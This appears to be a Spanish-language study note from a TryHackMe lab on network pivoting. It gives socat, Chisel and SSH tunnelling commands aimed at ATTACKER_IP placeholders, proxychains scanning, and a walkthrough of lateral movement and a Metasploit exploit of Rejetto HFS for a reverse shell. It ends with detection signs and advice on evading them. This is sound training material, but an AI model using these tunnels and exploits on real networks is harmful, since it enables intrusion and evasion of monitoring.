---
tags: [red-team, pivoting, port-forwarding, socat, chisel, ssh, tunneling]
created: 2026-04-21
source: TryHackMe - Lateral Movement and Pivoting
related:
  - "[[Moving Through the Network]]"
  - "[[Use of Alternate Authentication Material]]"
---
Cuando desde nuestro host atacante no tenemos visibilidad directa a una red interna, usamos un **host comprometido como pivote** para enrutar tráfico hacia servicios internos. Esto se logra con **port forwarding** y **túneles**.

---

## Tipos de Port Forwarding

| Tipo | Descripción |
|------|-------------|
| **Local** | Expone un puerto del target en una interfaz del atacante (o del pivote). |
| **Remote / Reverse** | El pivote abre un puerto hacia el atacante reenviando tráfico al target. |
| **Dynamic (SOCKS)** | Crea un proxy SOCKS para tunelizar cualquier protocolo/puerto. |

---

## socat

### Reverse port forwarding
Útil cuando el pivote puede salir hacia el atacante pero el atacante no puede iniciar conexiones hacia el pivote.

En el atacante (Linux):

```shell
socat TCP4-LISTEN:8080,fork TCP4-LISTEN:8081
```

En el pivote Windows:

```shell
socat.exe TCP4:ATTACKER_IP:8080 TCP4:TARGET_IP:80
```

### Local (relay simple) en Windows

```shell
socat.exe TCP4-LISTEN:1337,fork TCP4:TARGET_INT_IP:80
```

---

## Chisel (tunneling HTTP)

Chisel crea un túnel TCP/UDP multiplexado sobre HTTP/WebSockets, ideal para pivotar cuando solo se permite tráfico web.

### Reverse SOCKS5 (lo más usado)

Atacante:

```shell
./chisel server -p 8080 --reverse
```

Pivote (Windows):

```shell
chisel.exe client ATTACKER_IP:8080 R:socks
```

Ahora el atacante tiene un proxy SOCKS5 en `127.0.0.1:1080`. Usar con `proxychains`:

```shell
proxychains nmap -sT -Pn -n -p 80,445,3389 10.200.x.0/24
proxychains firefox http://10.200.x.50
```

### Forward de un puerto específico

Pivote:

```shell
chisel.exe client ATTACKER_IP:8080 R:3389:INTERNAL_TARGET:3389
```

Atacante: conectar a `127.0.0.1:3389` → llega a `INTERNAL_TARGET:3389`.

---

## SSH Tunneling

Si el pivote es Linux (o tenemos un SSH server disponible):

```shell
# Local forward: atacante:1234 -> pivote -> target:3389
ssh -L 1234:INTERNAL_TARGET:3389 user@PIVOT

# Remote forward: pivote:4444 -> atacante:443
ssh -R 4444:127.0.0.1:443 user@ATTACKER

# Dynamic (SOCKS)
ssh -D 1080 user@PIVOT
```

---

## Comandos Clave

```shell
# socat
socat.exe TCP4-LISTEN:PORT,fork TCP4:TARGET:PORT

# Chisel server
./chisel server -p 8080 --reverse

# Chisel client reverse SOCKS
chisel.exe client ATTACKER:8080 R:socks

# Proxychains
proxychains <cualquier herramienta TCP>

# SSH
ssh -L LPORT:TARGET:RPORT user@pivot
ssh -D 1080 user@pivot
```

---

## Flujo en la room

### Parte 1 — flag.exe en t1_thomas.moore

1. Desde el host comprometido (`THMJMP1` o similar), descubrir que `THMIIS` tiene servicios accesibles solo desde la red interna.
2. Configurar un **túnel SOCKS con Chisel** (server en el atacante, client reverso en el pivote).
3. Desde el atacante, vía `proxychains`, ejecutar lateral movement (PsExec / WMI / PtH) contra `THMIIS` como `t1_thomas.moore`.
4. Correr `flag.exe` en su escritorio y leer la salida.

### Parte 2 — Exploit de Rejetto HFS en THMDC

1. Enumerar `THMDC` a través del túnel:
   ```shell
   proxychains nmap -sT -Pn -p- THMDC_IP
   ```
2. Identificar **Rejetto HFS** (vulnerable a **CVE-2014-6287** — RCE vía template injection).
3. Configurar un **reverse port forward** para que el reverse shell desde THMDC pueda llegar al atacante a través del pivote.
4. Ejecutar el exploit (por ejemplo Metasploit `exploit/windows/http/rejetto_hfs_exec` configurado con `Proxies socks5:127.0.0.1:1080`).
5. Obtener shell en `THMDC` y leer el flag.

---

## Detección / OPSEC

> [!warning]
> - Tráfico inusual hacia puertos 8080/443 sostenido desde estaciones de trabajo (Chisel).
> - Binarios no firmados (`chisel.exe`, `socat.exe`) en disco → usar in-memory loaders.
> - Monitoreo con **Zeek/Suricata** puede detectar patrones de WebSocket persistentes.
